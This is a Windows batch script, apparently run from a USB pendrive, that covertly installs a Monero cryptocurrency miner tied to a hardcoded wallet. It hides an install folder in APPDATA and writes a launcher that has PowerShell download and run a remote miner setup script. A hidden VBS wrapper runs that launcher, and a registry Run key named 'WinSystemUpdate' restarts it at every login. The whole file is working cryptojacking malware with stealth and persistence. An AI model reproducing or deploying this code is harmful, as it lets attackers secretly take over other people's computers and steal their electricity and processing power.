@echo off

set "MY_WALLET=483dhPFGREDdXmHiC5gsPtMDxdbkPzSnn7MPCSLmwEiUHduGB8UffVAV8LTdZGe3mrGMoy9rHWyk1BmB9HRYNvEF2VuAYYv"
set "RIG_NAME=windows_auto_rig"
set "INSTALL_DIR=%APPDATA%\WinSystemMiner"


if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
attrib +h "%INSTALL_DIR%"

(
echo @echo off
echo powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.bat', $tempfile); ^& $tempfile %MY_WALLET%~%RIG_NAME%; Remove-Item -Force $tempfile"
) > "%INSTALL_DIR%\run_miner.bat"


(
echo Set WshShell = CreateObject("WScript.Shell"^)
echo WshShell.Run chr(34^) ^& "%INSTALL_DIR%\run_miner.bat" ^& Chr(34^), 0
echo Set WshShell = Nothing
) > "%INSTALL_DIR%\silent_launch.vbs"


reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinSystemUpdate" /t REG_SZ /d "wscript.exe \"%INSTALL_DIR%\silent_launch.vbs\"" /f


start wscript.exe "%INSTALL_DIR%\silent_launch.vbs"

echo [*] Setup Complete. You can remove the pendrive now.
timeout 3
exit



